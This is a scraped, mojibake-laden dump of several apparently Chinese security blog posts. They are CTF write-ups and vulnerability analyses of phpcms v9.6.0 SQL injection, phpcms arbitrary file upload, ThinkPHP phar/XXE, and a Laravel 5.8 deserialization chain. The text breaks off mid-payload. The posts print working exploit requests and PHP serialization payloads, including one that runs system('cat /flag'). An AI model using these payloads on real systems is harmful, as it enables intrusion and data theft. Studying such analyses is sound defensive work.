Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false Index.php 123456789101112131415161718&lt;?php&#x2F;&#x2F; +----------------------------------------------------------------------&#x2F;&#x2F; | ThinkPHP [ WE CAN DO IT JUST THINK ]&#x2F;&#x2F; +----------------------------------------------------------------------&#x2F;&#x2F; | Copyright (c) 2006-2018 http:&#x2F;&#x2F;thinkphp.cn All rights reserved.&#x2F;&#x2F; +----------------------------------------------------------------------&#x2F;&#x2F; | Licensed ( http:&#x2F;&#x2F;www.apache.org&#x2F;licenses&#x2F;LICENSE-2.0 )&#x2F;&#x2F; +----------------------------------------------------------------------&#x2F;&#x2F; | Author: liu21st &lt;liu21st@gmail.com&gt;&#x2F;&#x2F; +----------------------------------------------------------------------&#x2F;&#x2F; [ Ã¥ÂºÂ”Ã§Â”Â¨Ã¥Â…Â¥Ã¥ÂÂ£Ã¦Â–Â‡Ã¤Â»Â¶ ]namespace think;require __DIR__ . &#39;&#x2F;..&#x2F;vendor&#x2F;autoload.php&#39;;&#x2F;&#x2F; Ã¦Â‰Â§Ã¨Â¡ÂŒHTTPÃ¥ÂºÂ”Ã§Â”Â¨Ã¥Â¹Â¶Ã¥Â“ÂÃ¥ÂºÂ”(new App())-&gt;http-&gt;run()-&gt;send(); 1234567891011121314151617181920212223242526&lt;?phpnamespace app\\controller;use think\\facade\\Session;class Index extends Base&#123; public $view; public function __construct() &#123; parent::__construct(False); &#125; public function index() &#123; return $this-&gt;view-&gt;fetch(&quot;index&quot;); &#125; public function login() &#123; $username &#x3D; $this-&gt;request-&gt;post(&quot;username&quot;); $password &#x3D; $this-&gt;request-&gt;post(&quot;password&quot;); Session::clear(); Session::set(&quot;username&quot;,$username); Session::set(&quot;password&quot;,$password); &#125;&#125; æç¤ºéœ€è¦RCEï¼Œå¾ˆå®¹æ˜“è”æƒ³åˆ°tp5çš„RCE,é…åˆpharååºåˆ—åŒ–ï¼Œè¿™é‡Œååºåˆ—åŒ–çš„å…¥å£ç‚¹æ˜¯ 12345&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;phar:&#x2F;&#x2F;&#x2F;tmp&#x2F;xxx&quot;&gt;]&gt;&lt;ticket&gt;&lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt;&lt;code&gt;123123&lt;&#x2F;code&gt;&lt;&#x2F;ticket&gt; ç„¶åå‚è€ƒä¹‹å‰å†™çš„æ–‡ç« å³å¯ ç™¾è¶Šæ¯ç¬¬ä¸€é¢˜ ä¸€é“äºŒæ¬¡æ³¨å…¥ï¼Œæ³¨å†Œå¤„åˆ©ç”¨æŸ¥è¯¢çš„ç”¨æˆ·åæˆªå–ä¸€å®šé•¿åº¦æ¥å¯ä»¥è¿›è¡Œå¼•å·é€ƒé€¸ã€‚ æµ‹è¯•å‘ç°30ä½çš„æ—¶å€™æˆåŠŸé€ƒé€¸ä¸ºadmin[24ä¸ªç©ºæ ¼]\\ äºŒæ¬¡æŸ¥è¯¢çš„æ—¶å€™å˜æˆå¦‚ä¸‹ 1234select * from users where username&#x3D;&#39;admin \\&#39; and msgid&#x3D;&#39;1&#39;;#æ”»å‡»è¯­å¥select * from users where username&#x3D;&#39;admin \\&#39; and msgid&#x3D;&#39; or 1#&#39;; é‚£ä¹ˆåé¢å°±å¯ä»¥ç›²æ³¨äº† ç¬¬äºŒæ­¥ï¼Œ å¯¼å…¥å¤–éƒ¨xmlæ–‡æ¡£ï¼Œç±»ä¼¼äºphpçš„includeï¼Œå°†å¤–éƒ¨å®šä¹‰çš„dtdå¼•å…¥å½“å‰æ–‡ä»¶ï¼Œå› ä¸ºå¼•å…¥å¤–éƒ¨å®ä½“å…·æœ‰å±€é™æ€§ï¼Œæ‰€ä»¥ä½¿ç”¨xincludeæ¥å¼•å…¥ 123content&#x3D;&lt;root xmlns:xi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XInclude&quot;&gt; &lt;xi:include href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;flag&quot; parse&#x3D;&quot;text&quot;&#x2F;&gt;&lt;&#x2F;root&gt; ç¬¬äºŒé¢˜åŸé¢˜å°æ”¹ å°†Readç±»ä¸­çš„$varå˜é‡ä¿®æ”¹ä¸ºç§æœ‰å±æ€§ï¼Œå¯ä»¥è½»æ¾ç»•è¿‡ å¥½åƒæŠŠflagä½ç½®ä¹Ÿæ¢äº†ï¼Œæˆ‘æœ¬åœ°æµ‹å°±ä¸ç®¡äº†ğŸ˜€ ååºåˆ—åŒ–ï¼Œé¦–å…ˆå¯»æ‰¾é­”æœ¯æ–¹æ³•è§¦å‘ç‚¹ Showç±»çš„__construct()å¯ä»¥ä½œä¸ºå…¥å£ï¼Œechoæ—¶ è°ƒç”¨__toString()ï¼Œéœ€è¦æŠŠ$this-&gt;sourceè®¾ç½®ä¸ºShowç±» å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œ__invoke()æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚ é‚£ä¹ˆè§‚å¯Ÿåˆ°Testç±»ä¸­å­˜åœ¨return $func()ï¼Œéœ€è¦è°ƒç”¨__get()ï¼Œå³è°ƒç”¨ä¸å­˜åœ¨çš„å˜é‡ ä¹Ÿå°±æ˜¯è¯´åªéœ€è¦æŠŠstr[&#39;str&#39;]è®¾ç½®ä¸ºTestç±»å³å¯ï¼Œä¼šè°ƒç”¨ä¸å­˜åœ¨çš„source å†æŠŠTestç±»çš„$paramsè®¾ç½®ä¸ºReadç±»å³å¯è§¦å‘__invoke() æ„é€ payload 1234567891011121314151617181920212223242526&lt;?phperror_reporting(3);class Read &#123; private $var &#x3D; &#39;fllllllaaaaaag&#39;;&#125;class Show&#123; public $source; public $str;&#125;class Test&#123; public $params;&#125;$c &#x3D; new Read();$b &#x3D; new Test();$b-&gt;params &#x3D; $c;$d &#x3D; new Show();$d-&gt;str &#x3D; array(&#39;str&#39;&#x3D;&gt;$b);$a &#x3D; new Show();$a-&gt;source &#x3D; $d;echo urlencode(serialize($a)); å‚è€ƒé“¾æ¥https://1isten.xyz/2018/10/03/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9ssrf%E7%9A%84%E7%90%86%E8%A7%A3/ https://ray-cp.github.io/archivers/CVE-2017-17562-GoAhead-rce?tdsourcetag=s_pctim_aiomsg https://cloud.tencent.com/developer/article/1366247?client=tim&amp;ADUIN=243536998&amp;ADSESSION=1573306397&amp;ADTAG=CLIENT.QQ.5603_.0&amp;ADPUBNO=26933 https://www.cnblogs.com/20175211lyz/p/11560311.html","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"phpcms_v9.6.0SQLæ³¨å…¥æ¼æ´åˆ†æ","slug":"phpcms-v9-6-0SQLæ³¨å…¥æ¼æ´åˆ†æ","date":"2019-11-07T23:30:10.000Z","updated":"2020-04-02T04:13:22.062Z","comments":true,"path":"2019/11/08/phpcms-v9-6-0SQLæ³¨å…¥æ¼æ´åˆ†æ/","link":"","permalink":"https://glotozz.github.io/2019/11/08/phpcms-v9-6-0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• ä¸€ã€è·å–æ¼æ´ äºŒã€æ¼æ´å®ç° ä¸‰ã€æ¼æ´åˆ†æ å››ã€ä¿®å¤æ–¹æ¡ˆ å‚è€ƒé“¾æ¥ ä¸€ã€è·å–æ¼æ´phpcms_v9.6.0_UTF8 ä¸‹è½½é“¾æ¥ï¼šhttp://download.phpcms.cn/v9/9.6/ äºŒã€æ¼æ´å®ç°å‚è€ƒæ¼æ´åˆ†ææœ€åä¸€æ­¥ï¼Œå·æ‡’ ä¸‰ã€æ¼æ´åˆ†æèµ·ç‚¹åœ¨phpcms/modules/content/down.phpä¸­ï¼Œ æˆ‘ä»¬å¯æ§$a_kï¼Œè·Ÿè¸ªsys_auth()è¿™ä¸ªè§£ç å‡½æ•° è€ƒè™‘ä¼ªé€ ï¼Œè¿½è¸ªparse_str(), å†…ç½®å‡½æ•°parse_str()ä¼šè‡ªåŠ¨è¿›è¡Œurldecode()ä»¥åŠå­˜åœ¨å˜é‡è¦†ç›–æ¼æ´ ç»§ç»­å¾€ä¸‹çœ‹ï¼Œå­˜åœ¨sqlæŸ¥è¯¢è¯­å¥,ä¹Ÿå°±æ˜¯æˆ‘ä»¬å¯ä»¥æäº‹æƒ…çš„åœ°æ–¹ é‚£ä¹ˆè€ƒè™‘å¦‚ä½•ä¼ªé€ ï¼Œä¸ä¹‹å‰dedecmsæ¼æ´å¤ç°-2ä¸­çš„å‰å°ä»»æ„ç”¨æˆ·ç™»å½•æœ‰äº›ç›¸ä¼¼ä¹‹å¤„ åˆ¤æ–­cookieä¸­çš„DeDeUserID_ckMd5ä¸md5($cfg_cookie_encode.$_COOKIE[$key])çš„å‰16ä½æ¯”è¾ƒæ˜¯å¦ç›¸ç­‰ï¼Œåªè¦è¿‡äº†è¿™ä¸ªåˆ¤æ–­å°±æ²¡å•¥é—®é¢˜äº†ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä»»æ„ç”¨æˆ·çš„ä¸€ç»„æ¥ç»•è¿‡ å½“æ—¶æ˜¯å¯»æ‰¾PutCookie()ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ç›´æ¥å…¨å±€æœç´¢sys_auth(ï¼Œå¯»æ‰¾è°ƒç”¨sys_auth()æ–¹æ³•ä¸­çš„&#39;ENCODE&#39;ï¼Œä¸”ç¬¬ä¸€ä¸ªå˜é‡æˆ‘ä»¬è¦å¯æ§ phpcms/libs/classes/param.class.phpï¼ˆè¿™äº›åˆ©ç”¨ç‚¹çš„å¯»æ‰¾éœ€è¦è€å¿ƒï¼‰ å…¨å±€æœç´¢è°ƒç”¨è¿™ä¸ªset_cookie()ç±»æ–¹æ³•çš„åœ°æ–¹ï¼Œæœ‰å¾ˆå¤šï¼Œéšä¾¿é€‰ä¸€ä¸ª phpcms/modules/member/index.php ç»è¿‡ä¸€æ¬¡safe_replace()ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹ï¼Œä½†æ˜¯å› ä¸ºæˆ‘ä»¬å¯ä»¥äºŒæ¬¡urlencode()ç¼–ç ï¼Œç›®æµ‹é—®é¢˜ä¸å¤§ è¿™é‡Œçš„å•å¼•å·è¿‡æ»¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æœ€åä¸€ä¸ªæ›¿æ¢ä¸ºç©ºæ¥ç»•è¿‡ 1%2\\7 æ„é€ payloadï¼Œè°ƒè¯•ä¸‹ï¼Œå‘ç°åœ¨ä¸‹é¢æ–­äº† è¿™é‡Œçš„$nicknameå­˜åœ¨æ­£åˆ™åŒ¹é…ï¼Œæ‰“æ‰°äº†ï¼Œç»§ç»­å¯»æ‰¾è°ƒç”¨set_cookie() phpcms/modules/attachment/attachments.php å°†$arrè½¬åŒ–æˆjsonæ•°ç»„ï¼Œè€ƒè™‘$srcï¼Œè¿½è¸ªè°ƒç”¨è¿™ä¸ªæ–¹æ³•çš„åœ°æ–¹ è¿™é‡Œ$filepathä¼¼ä¹ä¸å¯æ§ã€‚ã€‚ã€‚ ç»§ç»­è¿½è¸ªï¼ŒåŒä¸ªæ–‡ä»¶ä¸­ èˆ’æœäº†ã€‚ã€‚æœç´¢è°ƒç”¨è¿™ä¸ªæ–¹æ³•çš„åœ°æ–¹ï¼Œæ²¡æœ‰æœç´¢åˆ°è°ƒç”¨è¿™ä¸ªæ–¹æ³•çš„ï¼Œjsä¸­å­˜åœ¨ajaxå‘Šè¯‰æˆ‘ä»¬ç›´æ¥è°ƒç”¨å³å¯ æ‰€ä»¥ä»¥åè¿˜æ˜¯å…ˆæŠŠæ¯ä¸ªå‡½æ•°å…ˆçœ‹çœ‹ä¸€çœ‹å†è¯´ï¼Œå¦‚æœæˆ‘ä¹‹å‰çœ‹åˆ°äº†è¿™ä¸ªè‚¯å®šå°±å…ˆå¯¹è¿™ä¸ªè¿›è¡Œæ¢ç´¢ 1$.get(&#39;index.php?m&#x3D;attachment&amp;c&#x3D;attachments&amp;a&#x3D;swfupload_json&amp;aid&#x3D;&#39;+id+&#39;&amp;src&#x3D;&#39;+src+&#39;&amp;filename&#x3D;&#39;+filename); é‚£ä¹ˆç›´æ¥æ„é€ payloadï¼ˆéœ€è¦ç”¨æˆ·ç™»å½•çŠ¶æ€ï¼‰ 123m&#x3D;1&amp;modelid&#x3D;1&amp;catid&#x3D;1&amp;f&#x3D;1&amp;id&#x3D;%2\\7 and extractvalue(1,concat(0x7e,database(),0x7e))#%6D%3D%31%26%6D%6F%64%65%6C%69%64%3D%31%26%63%61%74%69%64%3D%31%26%66%3D%31%26%69%64%3D%25%32%5C%37%20%61%6E%64%20%65%78%74%72%61%63%74%76%61%6C%75%65%28%31%2C%63%6F%6E%63%61%74%28%30%78%37%65%2C%64%61%74%61%62%61%73%65%28%29%2C%30%78%37%65%29%29%23 1http:&#x2F;&#x2F;127.0.0.1&#x2F;phpcms_v9.6.0&#x2F;index.php?m&#x3D;attachment&amp;c&#x3D;attachments&amp;a&#x3D;swfupload_json&amp;aid&#x3D;1&amp;filename&#x3D;&amp;src&#x3D;%6D%3D%31%26%6D%6F%64%65%6C%69%64%3D%31%26%63%61%74%69%64%3D%31%26%66%3D%31%26%69%64%3D%25%32%5C%37%20%61%6E%64%20%65%78%74%72%61%63%74%76%61%6C%75%65%28%31%2C%63%6F%6E%63%61%74%28%30%78%37%65%2C%64%61%74%61%62%61%73%65%28%29%2C%30%78%37%65%29%29%23 å¾—åˆ° 1GumfD_att_json&#x3D;0563E8s0JwxyefMwawZd9Chec7blhnAz-65r2rq46K-Q2hJdDjyAzNBVEH7GMJJEvYy9_D6rShNX7_Nffssd2YddtC4NMPYFmlfKaRo8kvuoLPjq2ktiJQt4M2KeSzl8pwcB1gZ70US1ITwn1VArlxgptns0RA-LFoIkwomQFVrW2HUAXbPzAtBNWa_hfGM å†å»down.phpæƒ³åŠæ³•è°ƒç”¨ è®¿é—® 1http:&#x2F;&#x2F;127.0.0.1&#x2F;phpcms_v9.6.0&#x2F;index.php?m&#x3D;content&amp;c&#x3D;down&amp;a&#x3D;init&amp;a_k&#x3D;0563E8s0JwxyefMwawZd9Chec7blhnAz-65r2rq46K-Q2hJdDjyAzNBVEH7GMJJEvYy9_D6rShNX7_Nffssd2YddtC4NMPYFmlfKaRo8kvuoLPjq2ktiJQt4M2KeSzl8pwcB1gZ70US1ITwn1VArlxgptns0RA-LFoIkwomQFVrW2HUAXbPzAtBNWa_hfGM æç¤ºå‚æ•°é”™è¯¯ï¼Œï¼Ÿï¼Ÿï¼Ÿï¼Ÿä¸åº”è¯¥å•Š çœ‹äº†ä¸‹åŠ›å“¥çš„ï¼Œå”¯ä¸€çš„å·®åˆ«æ˜¯ä¼ src=æ—¶m=1å‰å¤šä¸ª&amp;ï¼Œæˆ‘åŠ ä¸Šåè¯•äº†ä¸‹æœç„¶å¯ä»¥ è¿™é‡Œæ˜¯ä¸ªtrick 1$a_k &#x3D; &#123;&quot;aid&quot;:1,&quot;src&quot;:&quot;m&#x3D;1&amp;modelid&#x3D;1&amp;catid&#x3D;1&amp;f&#x3D;1&amp;id&#x3D;%27 and extractvalue(1,concat(0x7e,database(),0x7e))#&quot;,&quot;filename&quot;:&quot;&quot;&#125; å¦‚æœä¸åŠ &amp;ï¼Œæ‰“å°å˜é‡ é‚£ä¹ˆçœŸç›¸å¤§ç™½ï¼Œå…¶å®&amp;ç›¸å½“äºåˆ†éš”ç¬¦ï¼Œæ„Ÿè§‰è¿™é‡Œçš„parse_str()ç”¨çš„æŒºå¥‡æ€ªçš„ åŠ ä¸Š&amp;åæˆåŠŸ è™½ç„¶mysqlæŠ¥é”™äº†ï¼Œä½†æ˜¯è¿™é‡ŒæŠ¥é”™çš„åŸå› æ˜¯æˆ‘çš„mysqlç‰ˆæœ¬ä¸º5.0.96ï¼Œè€Œ5.1.5ä»¥ä¸Šæ‰æ”¯æŒè¿™ä¸ªå‡½æ•°ï¼Œä½†æ˜¯sqlè¯­å¥æ˜¯æ²¡é—®é¢˜çš„ï¼Œç›²æ³¨ä¹Ÿå¯ä»¥ å››ã€ä¿®å¤æ–¹æ¡ˆå¯¹sqlæŸ¥è¯¢çš„$idè¿›è¡Œintval()è¿‡æ»¤ å‚è€ƒé“¾æ¥ https://zhzhdoai.github.io/2019/10/11/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BPHPCMS-v9-6-0-SQL%E6%B3%A8%E5%85%A5/","categories":[],"tags":[{"name":"phpä»£ç å®¡è®¡","slug":"phpä»£ç å®¡è®¡","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"phpcms_v9.6.0ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ†æ","slug":"phpcms-v9-6-0ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ†æ","date":"2019-11-07T14:56:10.000Z","updated":"2020-04-02T07:46:22.903Z","comments":true,"path":"2019/11/07/phpcms-v9-6-0ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ†æ/","link":"","permalink":"https://glotozz.github.io/2019/11/07/phpcms-v9-6-0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• ä¸€ã€è·å–æ¼æ´ äºŒã€æ¼æ´å®ç° ä¸‰ã€æ¼æ´åˆ†æ å››ã€ä¿®å¤æ–¹æ¡ˆ å‚è€ƒé“¾æ¥ï¼š ä¸€ã€è·å–æ¼æ´phpcms_v9.6.0_UTF8 ä¸‹è½½é“¾æ¥ï¼šhttp://download.phpcms.cn/v9/9.6/ äºŒã€æ¼æ´å®ç°å‚è€ƒæ¼æ´åˆ†ææœ€åä¸€æ­¥ï¼Œå·æ‡’ ä¸‰ã€æ¼æ´åˆ†æè¿˜å¥½ä¹‹å‰æŒ–æ˜phpcms_v9.6.3çš„æ—¶å€™å¯¹æ•´ä½“æ¶æ„æœ‰äº†ä¸€å®šäº†è§£ æ¼æ´å­˜åœ¨äºç”¨æˆ·æ³¨å†Œå¤„ï¼Œ phpcms/modules/member/index.php è¿½è¸ªmember_inputç±»çš„get()æ–¹æ³• phpcms/modules/member/fields/member_input.class.php ç”±äºget()æ–¹æ³•ä»£ç è¾ƒé•¿ï¼Œåªè´´ä¸‹é¢å…³é”®ä¸¤è¡Œï¼Œå­˜åœ¨åŠ¨æ€æ–¹æ³•è°ƒç”¨ï¼Œé‚£ä¹ˆå…ˆè¿½è¸ª$funcï¼Œå³$this-&gt;fields[$field][&#39;formtype&#39;] æœç´¢ä¸‹ï¼Œå‘ç°æ˜¯åœ¨æ„é€ å‡½æ•°ä¸­ 12function __construct($modelid) &#123; $this-&gt;fields &#x3D; getcache(&#39;model_field_&#39;.$modelid,&#39;model&#39;); è¿½è¸ªgetcache()ï¼Œç›®æµ‹æ˜¯ä»è¿™ä¸ªæ‹¼æ¥æˆçš„æ–‡ä»¶åä¸­è¯»å–å†…å®¹ phpcms/libs/functions/global.func.php ä¼ å…¥$nameä¸ºmodel_field_xxxå’Œ$filpathä¸ºmodelï¼Œ$config=&#39;&#39;ï¼Œæ‰€ä»¥è¿½è¸ª $cache = cache_factory::get_instance()-&gt;get_cache($type); phpcms/libs/classes/cache_factory.class.php $cacheæ˜¯ä¸ªç¼“å­˜å·¥å‚ç±»ï¼Œè¿½è¸ªcache_fileç±»çš„get()æ–¹æ³• okï¼Œé‚£ä¹ˆè·¯å¾„çŸ¥é“äº†ï¼Œè¿½è¸ªä¸‹ï¼Œå‘ç°å•¥éƒ½æ²¡ï¼Œå› ä¸ºè‡ªå·±å®‰è£…å®Œè¿™ä¸ªcmsä¹‹åè¿˜æ²¡è®¿é—®è¿‡ï¼Œå½“ç„¶æ²¡ç¼“å­˜äº†ã€‚ æ³¨å†Œä¸€ä¸ªç”¨æˆ·åï¼Œå†æ¬¡æŸ¥çœ‹cachesæ–‡ä»¶å¤¹ åœ¨caches/caches_model/caches_data/model_field_1.cache.phpä¸­ è¿™é‡Œæ‰¾åˆ°editor()å‡½æ•°ï¼ˆæ„Ÿè§‰è¿™é‡Œè¿˜æ˜¯æ¯”è¾ƒèŠ±æ—¶é—´çš„ï¼‰ caches/caches_model/caches_data/member_input.class.php è·Ÿè¸ª$this-&gt;attachment 12function __construct($modelid) &#123; $this-&gt;attachment &#x3D; new attachment(&#39;content&#39;,&#39;0&#39;,$this-&gt;siteid); è·Ÿè¸ªdownload() è¿½è¸ª$this-&gt;upload_func 12function __construct($module&#x3D;&#39;&#39;, $catid &#x3D; 0,$siteid &#x3D; 0,$upload_dir &#x3D; &#39;&#39;) &#123; $this-&gt;upload_func &#x3D; &#39;copy&#39;; copy()å¯ä»¥å®ç°è¿œç¨‹æ–‡ä»¶ä¸‹è½½ æŸ¥çœ‹å…·ä½“å˜é‡ è·Ÿè¸ªfillurl()ï¼Œä»£ç æœ‰ç‚¹é•¿ï¼Œä¸»è¦æ˜¯æˆªå–#ä¹‹å‰çš„å­—ç¬¦ä¸² é‚£ä¹ˆå°è¯•æ„é€  123http:&#x2F;&#x2F;127.0.0.1&#x2F;phpcms_v9.6.0&#x2F;index.php?m&#x3D;member&amp;c&#x3D;index&amp;a&#x3D;register&amp;siteid&#x3D;1POST:siteid&#x3D;1&amp;modelid&#x3D;1&amp;info[content]&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;2.php#.jpg&amp;username&#x3D;3333&amp;password&#x3D;333333&amp;pwdconfirm&#x3D;333333&amp;email&#x3D;33%40qq.com&amp;nickname&#x3D;3333&amp;info%5Bbirthday%5D&#x3D;&amp;dosubmit&#x3D;%E5%90%8C%E6%84%8F%E6%B3%A8%E5%86%8C%E5%8D%8F%E8%AE%AE%EF%BC%8C%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%86%8C&amp;protocol&#x3D; å‘ç°è¿™é‡Œæ–­äº†ï¼Œè¿™é‡Œæ­£åˆ™åŒ¹é…ï¼Œé‚£ä¹ˆå‰é¢åŠ ä¸ªsrc= 1siteid&#x3D;1&amp;modelid&#x3D;1&amp;info[content]&#x3D;src&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;2.php#.jpg&amp;username&#x3D;3333&amp;password&#x3D;333333&amp;pwdconfirm&#x3D;333333&amp;email&#x3D;33%40qq.com&amp;nickname&#x3D;3333&amp;info%5Bbirthday%5D&#x3D;&amp;dosubmit&#x3D;%E5%90%8C%E6%84%8F%E6%B3%A8%E5%86%8C%E5%8D%8F%E8%AE%AE%EF%BC%8C%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%86%8C&amp;protocol&#x3D; æˆåŠŸï¼Œæ–‡ä»¶åå¯é¢„æµ‹ï¼Œè¿™é‡Œæˆ‘ä»¬è°ƒè¯•çš„æ—¶å€™å¯è§ä¸€æ–‘ å››ã€ä¿®å¤æ–¹æ¡ˆ å¯¹ä¸Šä¼ çš„æ–‡ä»¶åç¼€è¿›è¡Œé™åˆ¶ï¼Œä»ç„¶å¯ä»¥ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œä½†æ˜¯éœ€è¦é…åˆæ–‡ä»¶åŒ…å«ç­‰æ¼æ´ çº¸ä¸Šå¾—æ¥ç»ˆè§‰æµ…ï¼Œç»çŸ¥æ­¤äº‹è¦èº¬è¡Œã€‚çœ‹æ‡‚äº†æœªå¿…ä¼šç”¨ï¼Œå†µä¸”æœªå¿…çœŸçš„çœ‹æ‡‚äº† å‚è€ƒé“¾æ¥ï¼š https://zhzhdoai.github.io/2019/10/10/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BPHPCMS-v9-6-0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/ https://mochazz.github.io/2019/07/18/phpcms%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/#v9-6-0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0","categories":[],"tags":[{"name":"phpä»£ç å®¡è®¡","slug":"phpä»£ç å®¡è®¡","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"laravel5.8ååºåˆ—åŒ–æ¼æ´åˆ†æ","slug":"laravel5-8ååºåˆ—åŒ–æ¼æ´åˆ†æ","date":"2019-11-05T08:37:02.000Z","updated":"2020-04-02T07:34:30.870Z","comments":true,"path":"2019/11/05/laravel5-8ååºåˆ—åŒ–æ¼æ´åˆ†æ/","link":"","permalink":"https://glotozz.github.io/2019/11/05/laravel5-8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• æ¼æ´æ­å»º æ¼æ´åˆ†æ å‚è€ƒé“¾æ¥ æ¼æ´æ­å»ºåšbuuojçš„æ—¶å€™é‡åˆ°çš„ - [CISCN2019 æ€»å†³èµ› Day1 Web4]Laravel1 æœ‰ä¸ªéé¢„æœŸï¼Œpayloadç•™åœ¨logsä¸­ï¼Œå› ä¸ºstorage/logså­˜åœ¨æ—¥å¿— laravel5.8 æ¼æ´åˆ†æå­˜åœ¨ååºåˆ—åŒ–ï¼Œé‚£ä¹ˆéš¾ç‚¹å°±æ˜¯å¯»æ‰¾POPé“¾ å…¨å±€æœç´¢__destruct()ï¼Œæœ‰å¾ˆå¤šï¼Œä½†æ˜¯ç»éªŒå¤šäº†åˆ¤æ–­èµ·æ¥å°±å¿«äº†ã€‚ã€‚ã€‚ æˆ‘ç›´æ¥çœ‹å­˜åœ¨POPé“¾çš„åœ°æ–¹ vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/TagAwareAdapter.php è·Ÿè¸ªinvalidateTags() è·Ÿè¸ª$this-&gt;poolï¼Œè¿™æ˜¯ä¸€ä¸ªæˆ‘ä»¬å¯æ§çš„å˜é‡ï¼Œé‚£ä¹ˆå…¨å±€æœç´¢saveDeferred() æ„Ÿè§‰vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/ProxyAdapter.phpå¯èƒ½æœ‰æˆ è·Ÿè¸ªdoSave() å­˜åœ¨åŠ¨æ€è°ƒç”¨ï¼Œè¿™é‡Œå¯ä»¥ç”¨system()ï¼Œæœ€å¤šä¸¤ä¸ªå‚æ•° é‚£ä¹ˆåˆ†æå˜é‡ $this-&gt;setInnerItemå¯æ§ï¼Œ$innerItemæ˜¯æˆ‘ä»¬ä¼ å…¥çš„$itemç±»ä¸­çš„$innerItemå±æ€§ å¼•ç”¨ä¸ƒæœˆç«å¸ˆå‚…çš„è¯ é¦–å…ˆï¼Œç¨‹åºå°† $item ç±»å¼ºè½¬æˆæ•°ç»„ï¼ˆä¸Šå›¾ ç¬¬207è¡Œ ï¼‰ï¼Œç„¶åå†ä»æ•°ç»„ä¸­å–å€¼ä½œä¸ºä¸‹é¢åŠ¨æ€è°ƒç”¨å‡½æ•°çš„å‚æ•°ï¼ˆä¸Šå›¾ ç¬¬213è¡Œ ï¼‰ã€‚è¿™é‡Œå¯ä»¥çœ‹åˆ°æœ‰ $item[â€œ\\0*\\0expiryâ€]ã€$item[â€œ\\0*\\0poolHashâ€] è¿™ç§å†™æ³•ï¼Œæ•°ç»„é”®åå¸¦æœ‰ \\0*\\0 ã€‚è¿™å®é™…ä¸Šæ˜¯ç±»ä¸­ï¼Œä¿®é¥°ç¬¦ä¸º protected çš„å±æ€§ï¼Œåœ¨ç±»å¼ºè½¬æˆæ•°ç»„ä¹‹åçš„ç»“æœã€‚ 1if (!$item instanceof CacheItem) &#123; å®ä¾‹åŒ–ä¸€ä¸ªç»•è¿‡å³å¯ æ„é€ payload 1234567891011121314151617181920212223242526272829&lt;?phpnamespace Symfony\\Component\\Cache;class CacheItem &#123; protected $innerItem &#x3D; &#39;cat &#x2F;flag&#39;;&#125;namespace Symfony\\Component\\Cache\\Adapter;class ProxyAdapter&#123; private $setInnerItem &#x3D; &#39;system&#39;;&#125;class TagAwareAdapter&#123; public $deferred &#x3D; []; public function __construct() &#123; $this-&gt;pool &#x3D; new ProxyAdapter(); &#125;&#125;$a &#x3D; new TagAwareAdapter();$a -&gt; deferred &#x3D; array(&#39;a&#39; &#x3D;&gt; new \\Symfony\\Component\\Cache\\CacheItem);echo urlencode(serialize($a)); è‡ªå·±è¸©äº†å‡ ä¸ªå‘ï¼Œå¯¹phpè¯­æ³•æŒæ¡ä¸ç†Ÿç»ƒ private $deferred = array();éœ€è¦ä¿®æ”¹æˆpublic $deferred = array();å’Œæºç ä¸€è‡´ class ProxyAdapter implements AdapterInterface, CacheInterface, PruneableInterface, ResettableInterfaceå®ç°çš„æ¥å£ä¸éœ€è¦å†™ public $deferred = array(&#39;aa&#39;=&gt;new 